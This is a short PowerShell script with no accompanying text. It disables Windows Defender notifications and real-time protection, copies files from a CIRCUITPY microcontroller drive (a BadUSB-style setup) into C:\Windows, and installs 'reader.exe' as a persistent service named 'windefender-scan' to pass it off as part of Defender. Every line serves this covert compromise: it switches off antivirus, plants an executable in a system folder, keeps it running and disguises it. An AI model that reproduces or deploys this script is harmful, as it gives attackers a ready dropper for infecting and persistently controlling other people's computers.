
PowerShell -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications' -Name
'DisableEnhancedNotifications' -Value 1"

Set-MpPreference -DisableRealtimeMonitoring $true

$driveLetter = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.VolumeName -eq "CIRCUITPY" } | Select-Object -ExpandProperty DeviceID

if ($driveLetter) {
    $sourcePath = Join-Path $driveLetter "data"
    $destinationPath = "C:\Windows"

    if (Test-Path $sourcePath) {
        Copy-Item -Path "$sourcePath\*" -Destination $destinationPath -Recurse -Force
        Set-Location -Path $destinationPath

        $nssmPath = "nssm.exe"
        $serviceName = "windefender-scan"
        $exePath = Join-Path $destinationPath "reader.exe"

        if (Test-Path $nssmPath -and Test-Path $exePath) {
            & $nssmPath install $serviceName $exePath
            & $nssmPath start $serviceName
        } else {
            Write-Host "nssm.exe or reader.exe not found."
        }
    } else {
        Write-Host "Source folder 'data' not found on CIRCUITPY drive."
    }
} else {
    Write-Host "CIRCUITPY drive not found."
}
